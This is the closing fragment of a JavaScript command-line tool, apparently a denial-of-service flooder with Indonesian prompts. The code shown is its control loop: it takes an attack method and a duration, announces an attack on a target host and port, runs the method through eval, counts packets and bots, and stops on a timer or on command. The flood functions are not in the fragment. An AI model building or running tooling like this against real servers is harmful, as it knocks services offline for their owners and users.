        if (m === 'exit') { console.log('[EXIT] Bye!'); process.exit(0); }
        if (m === 'list') { showMethods(); askMethod(); return; }
        if (m === 'status') { showStats(); askMethod(); return; }
        if (m === 'stop') { stopAll(); console.log('[STOP] Attack stopped.\n'); askMethod(); return; }
        
        if (!METHODS[m]) {
            console.log(`[!] Unknown method: ${m}`);
            console.log('[!] Ketik "list" untuk lihat semua metode\n');
            askMethod();
            return;
        }
        
        METHOD = m;
        const info = METHODS[m];
        
        rl.question('⏱️  DURATION (detik) [30]: ', (dur) => {
            const duration = parseInt(dur) || 30;
            
            console.log(`\n⚡ Starting ${info.cat.toUpperCase()} attack: ${METHOD}`);
            console.log(`⚡ Target: ${TARGET.host}:${TARGET.port}`);
            console.log(`⚡ Duration: ${duration}s\n`);
            
            attackRunning = true;
            stats = { packets: 0, bots: 0, errors: 0, startTime: Date.now() };
            
            // Execute method
            const fn = eval(info.fn);
            fn(undefined, duration).catch(e => console.log(`[ERROR] ${e.message}`));
            
            // Auto stop
            attackTimeout = setTimeout(() => {
                attackRunning = false;
                console.log(`\n[⏱️] ${duration}s selesai. Attack stopped.\n`);
                showStats();
                askMethod();
            }, duration * 1000);
            
            // Allow manual stop
            rl.on('line', (line) => {
                if (line.trim().toLowerCase() === 'stop') {
                    clearTimeout(attackTimeout);
                    stopAll();
                    showStats();
                    setTimeout(() => askMethod(), 500);
                }
            });
        });
    });
}

process.on('SIGINT', () => { stopAll(); process.exit(0); });
main();